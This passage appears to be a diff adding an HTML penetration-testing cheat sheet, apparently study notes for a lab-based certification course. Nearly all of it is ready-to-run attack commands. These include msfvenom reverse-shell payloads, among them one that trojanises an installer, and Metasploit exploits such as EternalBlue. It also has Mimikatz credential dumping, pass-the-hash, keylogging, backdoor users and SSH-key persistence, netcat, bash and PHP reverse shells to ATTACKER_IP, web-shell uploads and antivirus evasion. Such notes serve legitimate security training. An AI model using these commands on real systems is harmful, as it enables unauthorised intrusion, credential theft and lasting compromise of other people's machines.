+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -i 10 -e x86/shikata_ga_nai -f exe &gt; &lt;PAYLOAD_ENCODED_x86&gt;.exe
+
+# Linux 32bit + shikata_ga_nai encoded
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -i 10 -e x86/shikata_ga_nai -f elf &gt; &lt;PAYLOAD_ENCODED_x86&gt;
+
+# Inject into Portable Executables
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe &gt; winrar.exe
+
+# JSP Java Meterpreter Reverse TCP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp #TomCat content management system 
+
+# PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php\                   #PHP Web Application
+cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre>
+              <h4 id="msf-staged-and-non-staged-payload">8.4.2 MSF Staged and Non Staged Payload</h4>
+              <pre><code class="language-bash"># MSF STAGED Payload
+windows/x64/meterpreter/reverse_tcp
+
+# MSF NON-STAGED Payload
+windows/x64/meterpreter_reverse_https</code></pre>
+              <pre><code class="language-bash"># Upload the payload on the target and try it with MSFconsole
+cd Payloads
+sudo python -m http.server 8080
+msfconsole -q
+
+use multi/handler
+set payload &lt;MSFVENOM_PAYLOAD&gt;
+set LHOST &lt;MSFVENOM_LOCAL_HOST_IP&gt;
+set LPORT &lt;MSFVENOM_LOCAL_PORT&gt;
+run</code></pre>
+              <pre><code class="language-bash"># Automation
+ls -lah /usr/share/metasploit-framework/scripts/resource
+
+# Create a handler resource
+nano handler.rc
+# Insert the following lines
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;LOCAL_HOST_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+run
+# Save it and exit
+
+msfconsole -q -r handler.rc
+
+# msfconsole
+resource handler.rc
+
+# Export inserted msfconsole commands into a resource script
+makerc &lt;FILE&gt;.rc</code></pre>
+              <h3 id="win-exploitation">8.5 Win Exploitation</h3>
+              <h4 id="default-msf-start">8.5.1 Default MSF Start</h4>
+              <pre><code class="language-bash">service postgresql start &amp;&amp; msfconsole -q</code></pre>
+              <pre><code class="language-bash">db_status
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+workspace -a &lt;SERVICE_NAME&gt;
+db_nmap -sS -sV -O &lt;TARGET_IP&gt;
+# db_nmap -sS -sV -O -p- &lt;TARGET_IP&gt;
+
+# For every exploit, check 'options' and 'info', setup accordingly</code></pre>
+              <h4 id="hfs">8.5.2 HFS</h4>
+              <pre><code class="language-bash"># HFS
+search type:exploit name:rejetto
+use exploit/windows/http/rejetto_hfs_exec</code></pre>
+              <h4 id="smb-2">8.5.3 SMB</h4>
+              <pre><code class="language-bash"># SMB
+search type:auxiliary EternalBlue
+use auxiliary/scanner/smb/smb_ms17_010
+use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+              <h4 id="winrm-1">8.5.4 WINRM</h4>
+              <pre><code class="language-bash"># WinRM
+search type:auxiliary winrm
+use auxiliary/scanner/winrm/winrm_auth_methods
+
+# Brute force WinRM login
+search winrm_login
+use auxiliary/scanner/winrm/winrm_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+# Launch command
+search winrm_cmd
+use auxiliary/scanner/winrm/winrm_cmd
+set USERNAME &lt;USER&gt;
+set PASSWORD &lt;PW&gt;
+set CMD whoami
+
+search winrm_script
+use exploit/windows/winrm/winrm_script_exec
+set USERNAME &lt;USER&gt;
+set PASSWORD &lt;PW&gt;
+set FORCE_VBS true</code></pre>
+              <h4 id="tomcat">8.5.5 TOMCAT</h4>
+              <pre><code class="language-bash"># APACHE TOMCAT
+search type:exploit tomcat_jsp
+use exploit/multi/http/tomcat_jsp_upload_bypass
+check
+
+set payload java/jsp_shell_bind_tcp
+set SHELL cmd
+run</code></pre>
+              <h3 id="linux-exploitation-1">8.6 Linux Exploitation</h3>
+              <h4 id="ftp-2">8.6.1 FTP</h4>
+              <pre><code class="language-bash"># FTP
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+/bin/bash -i</code></pre>
+              <h4 id="samba-1">8.6.2 SAMBA</h4>
+              <pre><code class="language-bash"># SAMBA
+search type:exploit name:samba
+use exploit/linux/samba/is_known_pipename
+
+# After exploit, proceed with Shell To Meterpreter if necessary</code></pre>
+              <h4 id="ssh-3">8.6.3 SSH</h4>
+              <pre><code class="language-bash"># SSH
+search libssh_auth_bypass
+use auxiliary/scanner/ssh/libssh_auth_bypass
+set SPAWN_PTY true
+run
+sessions
+sessions 1
+
+# After exploit, proceed with Shell To Meterpreter if necessary</code></pre>
+              <pre><code class="language-bash"># Some shell enumeration
+id
+cat /etc/*release
+uname -r</code></pre>
+              <h4 id="smtp-1">8.6.4 SMTP</h4>
+              <pre><code class="language-bash"># SMTP
+search libssh_auth_bypass
+use exploit/linux/smtp/haraka
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set LHOST &lt;LOCAL_IP&gt;
+set LPORT 8080
+run
+# This is a NON-staged payload</code></pre>
+              <h3 id="post-exploitation-fundamentals">8.7 Post-Exploitation Fundamentals</h3>
+              <pre><code class="language-bash"># METERPRETER
+run post/windows/manage/migrate
+migrate &lt;pid&gt; #more quickly
+## Pivoting
+portfwd add -l &lt;LOCAL_PORT&gt; -p &lt;TARGET_PORT&gt; -r &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash"># Manual SHELL TO METERPRETER
+background # or CTRL+Z
+sessions
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+set LHOST &lt;LOCAL_IP&gt;
+run
+
+sessions
+sessions 2
+
+# Auto SHELL TO METERPRETER
+sessions -u 1
+sessions 3</code></pre>
+              <h3 id="win-post-exploitation">8.8 Win Post-Exploitation</h3>
+              <h4 id="to-search-for-files-and-folders">8.8.1 To search for files and Folders</h4>
+              <pre><code class="language-bash">dir /b/s "*.conf*"
+dir /b/s "*.txt*"
+dir /b/s "*filename*"
+cd         #it's the same as 'pwd' command in linux
+type       #it's the same as 'cat' command in linux
+systeminfo         #information about the Operating System
+
+# Check Users
+cat /etc/passwd   #Users in linux  
+List drives on the machine
+
+fsutil fsinfo drives     #Check Drives</code></pre>
+              <h4 id="httphfs">8.8.2 HTTP/HFS</h4>
+              <pre><code class="language-bash"># Meterpreter
+sysinfo
+getuid
+getsystem
+getuid
+getprivs
+hashdump
+show_mount
+ps
+migrate
+
+# msfconsole
+use post/windows/manage/migrate
+use post/windows/gather/win_privs #CHECK UAC/Privileges
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/checkvm
+use post/windows/gather/enum_applications
+use post/windows/gather/enum_av_excluded
+use post/windows/gather/enum_computers
+use post/windows/gather/enum_patches
+use post/windows/gather/enum_shares
+use post/windows/manage/enable_rdp
+set SESSION 1
+
+loot</code></pre>
+              <h4 id="uac-1">8.8.3 UAC</h4>
+              <pre><code class="language-bash"># Meterpreter
+shell
+
+# Win CMD
+net users
+net localgroup administrators
+
+# Bypass UAC
+background
+sessions
+use exploit/windows/local/bypassuac_injection BYPASS UAC (Background the session first)
+set payload windows/x64/meterpreter/reverse_tcp
+set SESSION 1
+set LPORT &lt;LOCAL_PORT&gt;
+set TARGET Windows\ x64
+
+getsystem
+hashdump</code></pre>
+              <h4 id="token-impersonation">8.8.4 TOKEN IMPERSONATION</h4>
+              <pre><code class="language-bash"># Privilege Escalation - Meterpreter
+getuid
+getprivs
+hashdump
+load incognito
+list_tokens -u
+impersonate_token "ATTACKDEFENSE\Administrator"
+getuid
+ps
+migrate &lt;PID&gt;
+hashdump</code></pre>
+              <h4 id="dump-hashes">8.8.5 DUMP HASHES</h4>
+              <pre><code class="language-bash"># Kiwi - Meterpreter
+load kiwi
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+
+# Mimikatz - Meterpreter
+cd C:\\
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+shell
+
+mimikatz.exe
+privilege::debug
+lsadump::sam
+lsadump::secrets
+sekurlsa::logonPasswords</code></pre>
+              <pre><code class="language-bash"># PASS THE HASH - PSExec
+hashdump
+exit
+search psexec
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+set SMBUser Administrator
+set SMBPass &lt;ADMINISTRATOR_LM:NTLM_HASH&gt;</code></pre>
+              <h4 id="persistence">8.8.6 PERSISTENCE</h4>
+              <pre><code class="language-bash"># Administrative Privileges required!
+
+# RDP - Meterpreter
+background
+
+use exploit/windows/local/persistence_service
+set payload windows/meterpreter/reverse_tcp
+set SESSION 1
+
+# Regain access
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;LOCAL_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+
+# Enabling RDP
+use post/windows/manage/enable_rdp
+sessions
+set SESSION 1</code></pre>
+              <pre><code class="language-bash"># KEYLOGGING - Meterpreter
+keyscan_start
+keyscan_dump
+keyscan_stop</code></pre>
+              <h4 id="clearing">8.8.7 CLEARING</h4>
+              <pre><code class="language-bash"># Meterpreter
+clearenv</code></pre>
+              <h4 id="pivoting">8.8.8 PIVOTING</h4>
+              <pre><code class="language-bash"># Meterpreter
+run autoroute -s &lt;TARGET1_SUBNET_NETWORK&gt;
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS &lt;TARGET2_IP&gt;
+set PORTS 1-100
+
+# Port Forwarding
+sessions 1
+portfwd add -l &lt;LOCAL_PORT&gt; -p &lt;TARGET2_PORT&gt; -r &lt;TARGET2_IP&gt;
+background
+db_nmap -sS -sV -p &lt;LOCAL_PORT&gt; localhost
+# Target2 Exploitation
+use exploit/windows/http/badblue_passthru
+set payload windows/meterpreter/bind_tcp
+set RHOSTS &lt;TARGET2_IP&gt;
+set LPORT &lt;LOCAL_PORT2&gt;
+run</code></pre>
+              <h3 id="linux-post-exploitation">8.9 Linux Post-Exploitation</h3>
+              <pre><code class="language-bash"># Meterpreter - 'root' user
+shell
+
+# Local machine Enumeration
+/bin/bash -i
+whoami
+cat /etc/passwd #Users and services
+groups root
+cat /etc/*issue
+cat /etc/*release
+uname -a
+uname -r
+
+netstat -antp
+ss -tnl
+
+ps aux
+env
+
+lsblk -l #Check Drives
+
+# msfconsole
+use post/linux/gather/enum_configs
+use post/multi/gather/env
+use post/linux/gather/enum_network
+use post/linux/gather/enum_protections
+use post/linux/gather/enum_system
+use post/linux/gather/checkcontainer
+use post/linux/gather/checkvm
+use post/linux/gather/enum_users_history
+set SESSION 1
+
+loot</code></pre>
+              <pre><code class="language-bash"># PRIVILEGE ESCALATION - chkrootkit
+ps aux
+use exploit/unix/local/chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set SESSION 1
+set LHOST &lt;LOCAL_IP&gt;</code></pre>
+              <pre><code class="language-bash"># Dumping Hashes
+use post/linux/gather/hashdump
+use post/multi/gather/ssh_creds
+use post/linux/gather/ecryptfs_creds
+use post/linux/gather/enum_psk
+use post/linux/gather/pptpd_chap_secrets
+set SESSION 1</code></pre>
+              <pre><code class="language-bash"># PERSISTENCE
+# Meterpreter - Manual
+shell
+
+whoami
+	root
+cat /etc/passwd
+useradd -m ftp -s /bin/bash
+passwd ftp
+usermod -aG root ftp
+usermod -u 15 ftp
+groups ftp
+
+# SSH Key
+use post/linux/manage/sshkey_persistence
+set CREATESSHFOLDER true
+set SESSION 1
+
+# Persistence Test
+loot
+cat /root/.msf4/loot/DATE_Linux_Persistenc_&lt;TARGET_IP&gt;_id_rsa_.txt
+# Exit all the msfconsole sessions and close it
+exit -y
+
+vim ssh_key # paste Key
+chmod 0400 ssh_key
+ssh -i ssh_key root@&lt;TARGET_IP&gt;</code></pre>
+              <h3 id="armitage">8.10 Armitage</h3>
+              <pre><code class="language-bash"># Armitage Kali Linux - Install
+sudo apt install armitage -y
+sudo msfdb init
+sudo nano /etc/postgresql/15/main/pg_hba.conf
+# On line 87 switch “scram-sha-256” to “trust”
+sudo systemctl enable postgresql
+sudo systemctl restart postgresql
+sudo armitage</code></pre>
+              <h2 id="exploitation">9. Exploitation</h2>
+              <h3 id="vulnerability-scanning-1">9.1 Vulnerability Scanning</h3>
+              <pre><code class="language-bash"># BANNER GRABBING
+nmap -sV -O &lt;TARGET_IP&gt;
+nmap -sV --script=banner &lt;TARGET_IP&gt;
+ls -lah /usr/share/nmap/scripts | grep &lt;KEYWORD&gt;
+
+nc &lt;TARGET_IP&gt; &lt;TARGET_OPEN_PORT&gt;</code></pre>
+              <h3 id="exploits">9.2 Exploits</h3>
+              <pre><code class="language-bash"># SEARCHSPLOIT - Install
+sudo apt update &amp;&amp; sudo apt -y install exploitdb
+## Update
+searchsploit -u
+
+searchsploit [options] &lt;term&gt;
+
+# Copy an exploit to the current working dir
+searchsploit -m &lt;EXPLOIT_ID&gt;    
+# Case sensitive search
+searchsploit -c OpenSSH
+# Search just the exploit title
+searchsploit -t vsftpd
+# Exact search on title
+searchsploit -e "Windows 7"
+
+# Filters search
+searchsploit remote windows smb
+searchsploit remote linux ssh
+searchsploit remote linux ssh OpenSSH
+searchsploit remote webapps wordpress
+searchsploit local windows
+searchsploit local windows | grep -e "Microsoft"
+
+# List online links
+searchsploit -w remote windows smb | grep -e "EternalBlue"</code></pre>
+              <pre><code class="language-bash"># CROSS COMPILING
+sudo apt -y install mingw-w64 gcc
+
+## Windows Target
+searchsploit VideolAN VLC SMB
+searchsploit -m 9303
+# Compile for x64
+x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe
+# Compile for x86 (32-bit)
+i686-w64-mingw32-gcc 9303.c -o exploit32.exe
+
+## Linux Target
+searchsploit Dirty Cow
+searchsploit -m 40839
+gcc -pthread 40839.c -o dirty_exploit -lcrypt</code></pre>
+              <h3 id="shells">9.3 Shells</h3>
+              <pre><code class="language-bash"># NETCAT - Install
+sudo apt update &amp;&amp; sudo apt install -y netcat
+# or upload the nc.exe on the target machine
+
+nc &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt;
+nc -nv &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt;
+nc -nvu &lt;TARGET_IP&gt; &lt;TARGET_UDP_PORT&gt;
+
+## NC Listener
+nc -nvlp &lt;LOCAL_PORT&gt;
+nc -nvlup &lt;LOCAL_UDP_PORT&gt;
+
+## Transfer files
+# Target machine
+nc.exe -nvlp &lt;PORT&gt; &gt; test.txt
+# Attacker machine
+echo "Hello target" &gt; test.txt
+nc -nv &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt; &lt; test.txt</code></pre>
+              <pre><code class="language-bash"># BIND SHELL
+
+## Target Win machine - Bind shell listener with executable cmd.exe
+nc.exe -nvlp &lt;PORT&gt; -e cmd.exe
+## Attacker Linux machine
+nc -nv &lt;TARGET_IP&gt; &lt;PORT&gt;
+
+## Target Linux machine - Bind shell listener with /bin/bash
+nc -nvlp &lt;PORT&gt; -c /bin/bash
+## Attacker Win machine
+nc.exe -nv &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt;</code></pre>
+              <pre><code class="language-bash"># REVERSE SHELL
+
+## Attacker Linux machine
+nc -nvlp &lt;PORT&gt;
+## Target Win machine
+nc.exe -nv &lt;ATTACKER_IP&gt; &lt;ATTACKER_PORT&gt; -e cmd.exe
+
+## Attacker Linux machine
+nc -nvlp &lt;PORT&gt;
+## Target Linux machine
+nc -nv &lt;ATTACKER_IP&gt; &lt;ATTACKER_PORT&gt; -e /bin/bash</code></pre>
+              <pre><code class="language-bash"># Spawn shells
+python -c 'import pty; pty.spawn("/bin/sh")'
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;TARGET_IP&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+echo os.system('/bin/bash')
+/bin/sh -i
+bash -i &gt;&amp; /dev/tcp/&lt;TARGET_IP&gt;/4444 0&gt;&amp;1
+&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;TARGET_IP&gt;/4444 0&gt;&amp;1'"); ?&gt;
+/usr/bin/script -qc /bin/bash /dev/null
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+IRB: exec "/bin/sh"
+vi: :!bash
+vi: :set shell=/bin/bash:shell
+nmap: !sh</code></pre>
+              <h3 id="frameworks">9.4 Frameworks</h3>
+              <pre><code class="language-bash"># METASPLOIT - example
+service postgresql start &amp;&amp; msfconsole -q
+db_status
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+workspace -a &lt;SERVICE_NAME&gt;
+
+search &lt;SERVICE_NAME&gt;
+use exploit/multi/http/processmaker_exec
+options
+set USERNAME &lt;USER&gt;
+set PASSWORD &lt;PW&gt;
+run</code></pre>
+              <pre><code class="language-bash"># POWERSHELL EMPIRE - Install
+sudo apt update &amp;&amp; sudo apt install -y powershell-empire
+
+## Server run
+sudo powershell-empire server
+
+## Client run (another terminal session)
+sudo powershell-empire client
+listeners
+agents
+interact &lt;ID&gt;
+history</code></pre>
+              <h3 id="win-exploitation-1">9.5 Win Exploitation</h3>
+              <pre><code class="language-bash"># Attacker's machine - Find target IP
+cat /etc/hosts
+ping &lt;TARGET_IP&gt;
+ping &lt;TARGET_FQDN&gt;
+mkdir &lt;TARGET&gt;
+cd &lt;TARGET&gt;/
+
+# Port Scanning - 1000 common ports or more advanced scans
+nmap -sV &lt;TARGET_IP&gt;
+nmap -T4 -PA -sC -sV -p 1-10000 &lt;TARGET_IP&gt; -oX nmap_10k
+nmap -T4 -PA -sC -sV -p- &lt;TARGET_IP&gt; -oX nmap_all
+nmap -sU -sV &lt;TARGET_IP&gt; -oX nmap_udp
+
+# Banner Grabbing
+nc -nv &lt;TARGET_IP&gt; 21
+
+# Enumeration
+service postgresql start &amp;&amp; msfconsole
+db_status
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+workspace -a &lt;SERVICE_NAME&gt;
+db_import nmap_10k
+
+hosts
+services
+use auxiliary/scanner/smb/smb_version
+run
+hosts</code></pre>
+              <h4 id="iisftp">9.5.1 IIS/FTP</h4>
+              <pre><code class="language-bash"># Targeting IIS/FTP
+nmap -sV -sC -p21,80 &lt;TARGET_IP&gt;
+## Try anonymous:anonymous
+ftp &lt;TARGET_IP&gt;
+
+## Brute-force FTP
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt &lt;TARGET_IP&gt; ftp
+
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt &lt;TARGET_IP&gt; ftp -I
+hydra -l &lt;USER&gt; -P /usr/share/wordlists/metasploit/unix_users.txt &lt;TARGET_IP&gt; ftp -I
+
+## Generate an .asp reverse shell payload
+cd &lt;TARGET&gt;/
+ip -br -c a
+msfvenom -p windows/shell/reverse_tcp LHOST=&lt;LOCAL_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f asp &gt; shell.aspx
+
+## FTP Login with &lt;USER&gt;
+ftp &lt;TARGET_IP&gt;
+put shell.aspx
+
+## msfconsole
+use multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST &lt;LOCAL_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+
+## Open http://&lt;TARGET_IP&gt;/shell.aspx . A reverse shell may be received.</code></pre>
+              <h4 id="openssh">9.5.2 OPENSSH</h4>
+              <pre><code class="language-bash"># Targeting OPENSSH
+nmap -sV -sC -p 22 &lt;TARGET_IP&gt;
+
+searchsploit OpenSSH 7.1
+
+## Brute-force SSH
+hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt &lt;TARGET_IP&gt; ssh
+hydra -l &lt;USER&gt; -P /usr/share/wordlists/metasploit/unix_users.txt &lt;TARGET_IP&gt; ssh
+
+## SSH Login with &lt;USER&gt;
+ssh &lt;USER&gt;@&lt;TARGET_IP&gt;
+
+## Win
+bash
+net localgroup administrators
+whoami /priv
+
+# msfconsole
+use auxiliary/scanner/ssh/ssh_login
+setg RHOST &lt;TARGET_IP&gt;
+setg RHOSTS &lt;TARGET_IP&gt;
+set USERNAME &lt;USER&gt;
+set PASSWORD &lt;PW&gt;
+run
+session 1
+# CTRL+Z to background
+sessions -u 1</code></pre>
+              <h4 id="smb-3">9.5.3 SMB</h4>
+              <pre><code class="language-bash"># Targeting SMB
+nmap -sV -sC -p 445 &lt;TARGET_IP&gt;
+
+## Brute-force SMB
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt &lt;TARGET_IP&gt; smb
+hydra -l &lt;USER&gt; -P /usr/share/wordlists/metasploit/unix_passwords.txt &lt;TARGET_IP&gt; smb
+
+## Enumeration
+smbclient -L &lt;TARGET_IP&gt; -U &lt;USER&gt;
+smbmap -u &lt;USER&gt; -p &lt;PW&gt; -H &lt;TARGET_IP&gt;
+enum4linux -u &lt;USER&gt; -p &lt;PW&gt; -U &lt;TARGET_IP&gt;
+
+## msfconsole
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS &lt;TARGET_IP&gt;
+set SMBUser &lt;USER&gt;
+set SMBPass &lt;PW&gt;
+run
+
+## SMB Login with &lt;USER&gt;
+locate psexec.py
+cp /usr/share/doc/python3-impacket/examples/psexec.py .
+chmod +x psexec.py
+python3 psexec.py Administrator@&lt;TARGET_IP&gt;
+python3 psexec.py &lt;USER&gt;@&lt;TARGET_IP&gt;
+
+# msfconsole - Meterpreter
+use exploit/windows/smb/psexec
+set RHOSTS &lt;TARGET_IP&gt;
+set SMBUser Administrator
+set SMBPass &lt;PW&gt;
+set payload windows/x64/meterpreter/reverse_tcp
+run
+
+# Without &lt;USER&gt;:&lt;PW&gt;, exploit a vulnerability, e.g. EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS &lt;TARGET_IP&gt;
+run</code></pre>
+              <h4 id="mysql">9.5.4 MYSQL</h4>
+              <pre><code class="language-bash"># Targeting MYSQL (Wordpress)
+nmap -sV -sC -p 3306,8585 &lt;TARGET_IP&gt;
+
+searchsploit MySQL 5.5
+
+## Brute-force MySql - msfconsole
+msfconsole -q
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS &lt;TARGET_IP&gt;
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+run
+
+## MYSQL Login with &lt;USER&gt;
+mysql -u root -p -h &lt;TARGET_IP&gt;
+
+show databases;
+use &lt;db&gt;;
+show tables;
+select * from &lt;table&gt;;
+
+## msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS &lt;TARGET_IP&gt;
+run
+
+sysinfo
+cd /
+cd wamp
+dir
+cd www\\wordpress
+cat wp-config.php
+shell</code></pre>
+              <h3 id="linux-exploitation-2">9.6 Linux Exploitation</h3>
+              <pre><code class="language-bash"># Attacker's machine - Find target IP
+cat /etc/hosts
+ping &lt;TARGET_IP&gt;
+ping &lt;TARGET_FQDN&gt;
+mkdir &lt;TARGET&gt;
+cd &lt;TARGET&gt;/
+
+# Port Scanning - 1000 common ports or more advanced scans
+nmap -sV &lt;TARGET_IP&gt;
+nmap -sV -p 1-10000 &lt;TARGET_IP&gt; -oX nmap_10k
+nmap -T4 -PA -sC -sV -p 1-10000 &lt;TARGET_IP&gt; -oX nmap_10k
+nmap -T4 -PA -sC -sV -p- &lt;TARGET_IP&gt; -oX nmap_all
+nmap -sU -sV &lt;TARGET_IP&gt; -oX nmap_udp
+
+# Banner Grabbing - various ports e.g.
+nc -nv &lt;TARGET_IP&gt; 512
+nc -nv &lt;TARGET_IP&gt; 513
+nc -nv &lt;TARGET_IP&gt; 1524
+
+# Enumeration
+cat /etc/*release
+whoami</code></pre>
+              <h4 id="vsftpd">9.6.1 VSFTPD</h4>
+              <pre><code class="language-bash"># Targeting VSFTPD
+nmap -sV -sC -p 21 &lt;TARGET_IP&gt;
+
+## Try anonymous:anonymous
+ftp &lt;TARGET_IP&gt;
+
+## Exploit vsFTPd
+searchsploit vsftpd
+searchsploit -m 49757
+vim 49757.py
+chmod +x 49757.py
+python3 49757.py &lt;TARGET_IP&gt;
+
+## Enumerate SMTP - msfconsole
+use auxiliary/scanner/smtp/smtp_enum
+setg RHOSTS &lt;TARGET_IP&gt;
+set UNIXONLY true
+run
+
+## Brute-force FTP
+hydra -l &lt;USER&gt; -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt &lt;TARGET_IP&gt; ftp
+
+## Modify the shell via FTP
+cp /usr/share/webshells/php/php-reverse-shell.php .
+mv php-reverse-shell.php shell.php
+vim shell.php
+## Change the $ip &amp; $port variable to the Attacker's IP &amp; port
+
+ftp &lt;TARGET_IP&gt;
+cd /
+cd /var/www/dav
+put shell.php
+
+## Attacker listener
+nc -nvlp &lt;PORT&gt;
+## Open http://&lt;TARGET_IP&gt;/dav/shell.php
+
+/bin/bash -i</code></pre>
+              <pre><code class="language-bash"># Targeting PHP
+nmap -sV -sC -p 80 &lt;TARGET_IP&gt;
+
+## Browse
+http://&lt;TARGET_IP&gt;/phpinfo.php
+
+## Manual Exploitation PHP CGI
+searchsploit php cgi
+searchsploit -m 18836
+python2 18836.py &lt;TARGET_IP&gt; 80
+## If it executes, modify the .py script
+vim 18836.php
+## PHP Reverse Shell
+pwn_code = """&lt;?php $sock=fsockopen("&lt;ATTACKER_IP&gt;",&lt;PORT&gt;);exec("/bin/sh -i &lt;&amp;4 &gt;&amp;4 2&gt;&amp;4");?&gt;"""
+
+## Attacker listener in another tab
+nc -nvlp &lt;PORT&gt;
+## Launch the exploit
+python2 18836.py &lt;TARGET_IP&gt; 80</code></pre>
+              <pre><code class="language-bash"># Targeting SAMBA
+nmap -sV -p 445 &lt;TARGET_IP&gt;
+
+nc -nv &lt;TARGET_IP&gt; 445
+
+searchsploit samba 3.0.20
+
+# msfconsole
+use auxiliary/scanner/smb/smb_version
+setg RHOSTS &lt;TARGET_IP&gt;
+run
+
+use exploit/multi/samba/usermap_script
+run
+background
+sessions -u 1
+sessions 2
+
+cat /etc/shadow</code></pre>
+              <h3 id="obfuscation">9.7 Obfuscation</h3>
+              <pre><code class="language-bash"># SHELLTER - Install
+sudo apt update &amp;&amp; sudo apt install -y shellter
+sudo dpkg --add-architecture i386 &amp;&amp; sudo apt update &amp;&amp; sudo apt -y install wine32
+rm -r ~/.wine
+
+cd /usr/share/windows-resources/shellter
+sudo shellter
+
+mkdir AVBypass
+cd AVBypass
+cp /usr/share/windows-binaries/vncviewer.exe .
+# Proceed in Sellter window</code></pre>
+              <pre><code class="language-bash"># INVOKE-OBFUSCATION PowerShell script - Install
+cd /opt
+sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
+sudo apt update &amp;&amp; sudo apt install -y powershell
+
+pwsh
+cd /opt/Invoke-Obfuscation/
+Import-Module ./Invoke-Obfuscation.psd1
+cd ..
+Invoke-Obfuscation</code></pre>
+              <h2 id="post-exploitation">10. Post-Exploitation</h2>
+              <h3 id="win-local-enumeration">10.1 Win Local Enumeration</h3>
+              <pre><code class="language-bash"># MSF Meterpreter
+getuid
+sysinfo
+show_mount
+cat C:\\Windows\\System32\\eula.txt
+getprivs
+pgrep explorer.exe
+migrate &lt;PROCESS_ID&gt;
+
+# Win CMD - run 'shell' in Meterpreter
+## System
+hostname
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+## Users
+whoami
+whoami /priv
+query user
+net users
+net user &lt;USER&gt;
+net localgroup
+net localgroup Administrators
+net localgroup "Remote Desktop Users"
+
+## Network
+ipconfig
+ipconfig /all
+route print
+arp -a
+netstat -ano
+netsh firewall show state
+netsh advfirewall show allprofiles
+
+## Services
+ps
+net start
+wmic service list brief
+tasklist /SVC
+schtasks /query /fo LIST
+schtasks /query /fo LIST /v
+
+# Metasploit
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/win_privs
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/checkvm
+use post/windows/gather/enum_applications
+use post/windows/gather/enum_computers
+use post/windows/gather/enum_patches
+use post/windows/gather/enum_shares
+
+# JAWS - Automatic Local Enumeration - Powershell
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt</code></pre>
+              <h3 id="linux-local-enumeration">10.2 Linux Local Enumeration</h3>
+              <pre><code class="language-bash"># MSF Meterpreter
+getuid
+sysinfo
+ifconfig
+netstat
+route
+arp
+ps
+pgrep vsftpd
+
+# Linux SHELL - run 'shell' in Meterpreter
+## System
+/bin/bash -i
+cd /root
+hostname
+cat /etc/*issue
+cat /etc/*release
+uname -a
+dpkg -l
+
+env
+lscpu
+free -h
+df -h
+lsblk | grep sd
+
+## Users
+whoami
+ls -lah /home
+cat /etc/passwd
+cat /etc/passwd | grep -v /nologin
+groups &lt;USER&gt;
+groups root
+groups
+who
+w
+last
+lastlog
+
+## Network
